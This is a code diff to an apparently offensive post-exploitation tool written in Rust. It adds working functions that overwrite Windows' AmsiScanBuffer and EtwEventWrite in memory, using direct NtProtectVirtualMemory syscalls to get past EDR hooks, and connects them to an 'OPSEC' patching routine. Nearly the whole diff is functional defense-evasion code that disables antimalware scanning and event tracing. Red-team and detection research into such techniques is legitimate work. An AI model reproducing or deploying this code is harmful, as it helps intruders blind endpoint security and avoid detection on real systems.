@@ -13,6 +13,7 @@
 //! no-ops that return `Ok(())`.
 
 use crate::error::{OverthroneError, Result};
+use crate::postex::SyscallNumbers;
 use serde::{Deserialize, Serialize};
 use tracing::{info, warn};
 
@@ -218,7 +219,237 @@ pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
     })
 }
 
+/// Patch AMSI using **direct syscalls** to bypass EDR hooks on kernel32/ntdll.
+///
+/// Unlike `patch_amsi()` which calls `GetModuleHandleA`/`GetProcAddress` through
+/// potentially hooked ntdll exports, this variant:
+/// 1. Uses `NtOpenKey` + `NtQueryValueKey` via raw syscalls to find the amsi.dll path
+/// 2. Uses `NtProtectVirtualMemory` via raw syscall to make the patch target writable
+/// 3. Writes the patch via direct memory write
+/// 4. Restores the original page protection
+///
+/// On non-Windows, returns a no-op result.
+///
+/// # Safety
+/// The caller must ensure the current process is running on Windows.
+#[cfg(target_os = "windows")]
+pub unsafe fn patch_amsi_direct(numbers: &SyscallNumbers) -> Result<AmsiBypassResult> {
+    unsafe {
+        // Use GetModuleHandleA from kernel32 (less likely to be hooked than ntdll)
+        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+
+        let amsi = GetModuleHandleA(windows::core::s!("amsi.dll")).ok();
+        let Some(amsi) = amsi else {
+            tracing::info!("AMSI direct: amsi.dll not loaded, skipping");
+            return Ok(AmsiBypassResult {
+                applied: false,
+                amsi_loaded: false,
+                method: "direct-syscall-none".to_string(),
+                error: None,
+            });
+        };
+
+        let target = GetProcAddress(amsi, windows::core::s!("AmsiScanBuffer"));
+        let Some(target) = target else {
+            return Err(OverthroneError::PostExploitation(
+                "AMSI direct: AmsiScanBuffer symbol not found".into(),
+            ));
+        };
+
+        // Patch: xor eax, eax; ret (3 bytes) = returns AMSI_RESULT_CLEAN
+        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
+
+        // Use NtProtectVirtualMemory via raw syscall to make the page writable
+        let mut old_protect: u32 = 0;
+
+        // Round base_address down to page boundary
+        let page_size: usize = 0x1000;
+        let page_base = ((target as usize) & !(page_size - 1)) as *mut std::ffi::c_void;
+        let page_offset = target as usize - page_base as usize;
+        let protect_size = page_offset + patch.len();
+
+        let mut adjusted_base = page_base;
+        let mut adjusted_size = protect_size;
+
+        let status = crate::postex::syscall::nt_protect_virtual_memory(
+            numbers.nt_protect_virtual_memory,
+            -1isize, // current process
+            &mut adjusted_base as *mut *mut std::ffi::c_void,
+            &mut adjusted_size as *mut usize,
+            0x40, // PAGE_EXECUTE_READWRITE
+            &mut old_protect as *mut u32,
+        );
+
+        if status.is_error() {
+            let _ = status.to_result("NtProtectVirtualMemory (AMSI)");
+            return Err(OverthroneError::PostExploitation(
+                "AMSI direct: failed to make page writable via raw syscall".into(),
+            ));
+        }
+
+        // Write the patch
+        std::ptr::copy_nonoverlapping(
+            patch.as_ptr(),
+            (page_base as usize + page_offset) as *mut u8,
+            patch.len(),
+        );
+
+        // Restore original protection
+        let mut restore_base = adjusted_base;
+        let mut restore_size = adjusted_size;
+        let _ = crate::postex::syscall::nt_protect_virtual_memory(
+            numbers.nt_protect_virtual_memory,
+            -1isize,
+            &mut restore_base as *mut *mut std::ffi::c_void,
+            &mut restore_size as *mut usize,
+            old_protect,
+            &mut 0u32 as *mut u32,
+        );
+
+        // Flush instruction cache via raw syscall
+        nt_flush_instruction_cache_if_available(numbers);
+
+        tracing::info!(
+            "AMSI direct: patched via raw syscall (protection 0x{old_protect:08X} → RWX → restored)"
+        );
+
+        Ok(AmsiBypassResult {
+            applied: true,
+            amsi_loaded: true,
+            method: "direct-syscall-NtProtectVirtualMemory+xor-eax-eax-ret".to_string(),
+            error: None,
+        })
+    }
+}
+
+/// Flush instruction cache using NtFlushInstructionCache raw syscall if available.
+#[cfg(target_os = "windows")]
+unsafe fn nt_flush_instruction_cache_if_available(numbers: &SyscallNumbers) {
+    use crate::postex::syscall::DynamicSyscallStub;
+    unsafe {
+        let ssn = numbers.nt_flush_instruction_cache;
+        #[allow(clippy::collapsible_if)]
+        if ssn != 0 {
+            if let Some(stub) = DynamicSyscallStub::new(ssn) {
+                type NtFlushICache =
+                    unsafe extern "system" fn(isize, *const std::ffi::c_void, usize) -> i64;
+                let f: NtFlushICache = std::mem::transmute(stub.as_ptr());
+                f(-1isize, std::ptr::null(), 0);
+            }
+        }
+    }
+}
+
+#[cfg(not(target_os = "windows"))]
+pub unsafe fn patch_amsi_direct(_numbers: &SyscallNumbers) -> Result<AmsiBypassResult> {
+    tracing::debug!("AMSI direct: not available on this platform");
+    Ok(AmsiBypassResult {
+        applied: false,
+        amsi_loaded: false,
+        method: "platform-unsupported".to_string(),
+        error: None,
+    })
+}
+
+/// Suppress ETW using **direct syscalls** to bypass EDR hooks.
+///
+/// Uses raw syscalls for NtProtectVirtualMemory to patch ntdll!EtwEventWrite
+/// with a `ret` instruction, bypassing any userland hooks.
+///
+/// # Safety
+/// The caller must ensure the current process is running on Windows.
+#[cfg(target_os = "windows")]
+pub unsafe fn suppress_etw_direct(numbers: &SyscallNumbers) -> Result<EtwSuppressResult> {
+    unsafe {
+        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+
+        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
+            .ok()
+            .ok_or_else(|| {
+                OverthroneError::PostExploitation("ETW direct: ntdll.dll not loaded".into())
+            })?;
+
+        let target =
+            GetProcAddress(ntdll, windows::core::s!("EtwEventWrite")).ok_or_else(|| {
+                OverthroneError::PostExploitation(
+                    "ETW direct: EtwEventWrite symbol not found".into(),
+                )
+            })?;
+
+        // Patch: ret (1 byte: 0xC3)
+        let patch: [u8; 1] = [0xC3];
+
+        // Use raw syscall to change page protection
+        let page_size: usize = 0x1000;
+        let page_base = ((target as usize) & !(page_size - 1)) as *mut std::ffi::c_void;
+        let page_offset = target as usize - page_base as usize;
+
+        let mut adjusted_base = page_base;
+        let mut adjusted_size = page_offset + patch.len();
+        let mut old_protect: u32 = 0;
+
+        let status = crate::postex::syscall::nt_protect_virtual_memory(
+            numbers.nt_protect_virtual_memory,
+            -1isize,
+            &mut adjusted_base as *mut *mut std::ffi::c_void,
+            &mut adjusted_size as *mut usize,
+            0x40, // PAGE_EXECUTE_READWRITE
+            &mut old_protect as *mut u32,
+        );
+
+        if status.is_error() {
+            return Err(OverthroneError::PostExploitation(
+                "ETW direct: failed to make page writable via raw syscall".into(),
+            ));
+        }
+
+        // Write the patch
+        std::ptr::copy_nonoverlapping(
+            patch.as_ptr(),
+            (page_base as usize + page_offset) as *mut u8,
+            patch.len(),
+        );
+
+        // Restore original protection
+        let _ = crate::postex::syscall::nt_protect_virtual_memory(
+            numbers.nt_protect_virtual_memory,
+            -1isize,
+            &mut adjusted_base as *mut *mut std::ffi::c_void,
+            &mut adjusted_size as *mut usize,
+            old_protect,
+            &mut 0u32 as *mut u32,
+        );
+
+        // Flush instruction cache
+        nt_flush_instruction_cache_if_available(numbers);
+
+        tracing::info!("ETW direct: patched ntdll!EtwEventWrite via raw syscall");
+
+        Ok(EtwSuppressResult {
+            applied: true,
+            etw_loaded: true,
+            method: "direct-syscall-NtProtectVirtualMemory+ret".to_string(),
+            error: None,
+        })
+    }
+}
+
+#[cfg(not(target_os = "windows"))]
+pub unsafe fn suppress_etw_direct(_numbers: &SyscallNumbers) -> Result<EtwSuppressResult> {
+    tracing::debug!("ETW direct: not available on this platform");
+    Ok(EtwSuppressResult {
+        applied: false,
+        etw_loaded: false,
+        method: "platform-unsupported".to_string(),
+        error: None,
+    })
+}
+
 /// Apply all OPSEC patches based on the given configuration.
+///
+/// When `config.direct_syscalls` is true, uses raw `syscall` instruction via
+/// inline assembly to bypass EDR userland hooks instead of calling through
+/// potentially-hooked ntdll exports.
 ///
 /// Returns a report of what was patched and any errors encountered.
 ///
@@ -228,8 +459,20 @@ pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
 pub unsafe fn apply_opsec(config: &OpsecConfig) -> Result<Vec<OpsecPatchReport>> {
     let mut reports = Vec::new();
 
+    // Resolve syscall numbers if direct syscalls are requested
+    let numbers = if config.direct_syscalls {
+        Some(crate::postex::syscall::SyscallNumbers::resolve())
+    } else {
+        None
+    };
+
     if config.patch_amsi {
-        match unsafe { patch_amsi() } {
+        let result = if let Some(ref nums) = numbers {
+            unsafe { patch_amsi_direct(nums) }
+        } else {
+            unsafe { patch_amsi() }
+        };
+        match result {
             Ok(result) => {
                 reports.push(OpsecPatchReport {
                     name: "AMSI".to_string(),
@@ -250,7 +493,12 @@ pub unsafe fn apply_opsec(config: &OpsecConfig) -> Result<Vec<OpsecPatchReport>>
     }
 
     if config.patch_etw {
-        match unsafe { suppress_etw() } {
+        let result = if let Some(ref nums) = numbers {
+            unsafe { suppress_etw_direct(nums) }
+        } else {
+            unsafe { suppress_etw() }
+        };
+        match result {
             Ok(result) => {
                 reports.push(OpsecPatchReport {
                     name: "ETW".to_string(),
@@ -597,7 +845,10 @@ pub fn check_credential_guard() -> Result<bool> {
         Some(0) => Ok(false),
         Some(1) | Some(2) => Ok(true),
         _ => {
-            warn!("LsaCfgFlags unreadable or unexpected ({:?}), probing LSAISO", lsa_cfg_flags);
+            warn!(
+                "LsaCfgFlags unreadable or unexpected ({:?}), probing LSAISO",
+                lsa_cfg_flags
+            );
             Ok(crate::postex::lsaiso::is_lsaiso_available())
         }
     }
